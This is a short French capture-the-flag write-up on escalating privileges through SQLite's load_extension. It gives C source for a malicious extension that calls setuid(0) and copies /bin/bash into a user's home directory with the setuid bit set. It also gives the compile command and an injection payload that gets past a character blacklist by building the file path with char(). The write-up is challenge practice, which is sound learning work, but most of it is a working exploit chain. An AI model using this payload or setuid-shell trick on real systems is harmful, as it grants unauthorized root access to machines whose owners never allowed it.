
d'après la doc sqlite on peut créer une extension et la load dans sqlite en compilant un code C avec la commande :
```bash
gcc -g -fPIC -shared YourCode.c -o YourCode.so
```

source : 
https://www.sqlite.org/loadext.html

pour la load on utilise la fonction `load_extention()` référencée ici : 
https://www.sqlite.org/lang_corefunc.html#load_extension

Dans la documentation, on a un exemple de ce a quoi ressemble une extention sqlite3 ainsi qu'une explication importante :

```c
/* TODO: Change the entry point name so that "extension" is replaced by
** text derived from the shared library filename as follows:  Copy every
** ASCII alphabetic character from the filename after the last "/" through
** the next following ".", converting each character to lowercase, and
** discarding the first three characters if they are "lib".
*/
int sqlite3_extension_init(){
	// main here
}
```


On va donc programmer notre propre extension et essayer d'obtenir un shell
on doit changer le nom de "sqlite3_extension_init" et remplacer "extension" par le nom de notre executable. Le code final copie bash dans le repertoire de tom en le rendant executable ressemble donc a ca :

```c
#include <unistd.h>
#include <stdlib.h>

int sqlite3_i_init(){
  setgid(0);
  setuid(0);
  system("/usr/bin/cp /bin/bash /home/tom && /usr/bin/chmod +s /home/tom/bash");
  return 0;
}
```

on compile avec la commande : 
`gcc -g -fPIC -shared injection.c -o i`

dans le contexte du challenge, on a le droit de mettre des parenthèses donc on peut utiliser la fonction char pour créer une string et ainsi utiliser des caractères blacklistés
`./i == char(46,47,105)`

payload final : 
`"+load_extension(char(46,47,105))+"`


